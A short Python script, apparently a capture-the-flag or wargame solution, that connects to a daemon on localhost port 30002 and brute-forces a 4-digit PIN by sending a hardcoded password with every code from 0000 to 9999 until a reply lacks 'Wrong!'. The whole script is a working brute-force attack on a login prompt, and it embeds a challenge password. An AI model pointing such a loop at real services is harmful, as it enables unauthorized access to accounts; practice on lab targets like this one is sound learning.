#!/usr/bin/python
import socket

#program to brute-froce 4 digit pass-code to daemon on local machine
host = 'localhost'
port = 30002
passw = 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'

#Creates new socket object to connect to daemon
#(socket.AF_INET) specifies address family: IPv4
#(socket.SOCK_STREAM) specifies socket type: stream type for TCP
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    #connects socket to daemon
    s.connect((host, port))

    #print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)

    #4-digit code combination
    for i in range(10000):
        # Format the number to always be 4 digits with leading zeros
        formatted_number = '{:04d}'.format(i)
        message = passw + ' ' + str(formatted_number) + '\n'
        s.sendall(message.encode())
        receive_msg = s.recv(1024).decode()

        #check output
        if "Wrong!" in receive_msg:
            print("Wrong code: %s" % formatted_number)
        else:
            print(receive_msg)
            break

    #recieves data from daemon
    data = s.recv(1024).decode()
    print('recieved', data)